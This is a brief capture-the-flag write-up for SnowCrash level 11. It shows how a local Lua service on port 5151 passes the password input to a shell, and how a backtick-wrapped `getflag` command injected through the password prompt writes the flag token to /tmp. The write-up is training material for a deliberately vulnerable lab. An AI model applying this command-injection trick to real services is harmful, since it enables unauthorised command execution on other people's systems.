▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▌ ▐▓▓▌ 
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌    ▐▓▌  ▐▓▌ 
▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌    ▐▓▌  ▐▓▌ 
▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌    ▐▓▌  ▐▓▌ 
▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▌▐▓▓▓▌

exploit:

=======
We have a .lua file again.
This time the port is used that means the server is on. We can verify using:
nc localhost 5151
Password: test
Erf nope..

nc localhost 5151
Password: echo 'bonjour' > /tmp/test4
Erf nope..

cat /tmp/test4
echo bonjour

ok so that means we can actually execute stuff inside the password !

nc localhost 5151
Password: `getflag` > /tmp/test7
Erf nope..
level11@SnowCrash:~$ cat /tmp/test7
we get the token
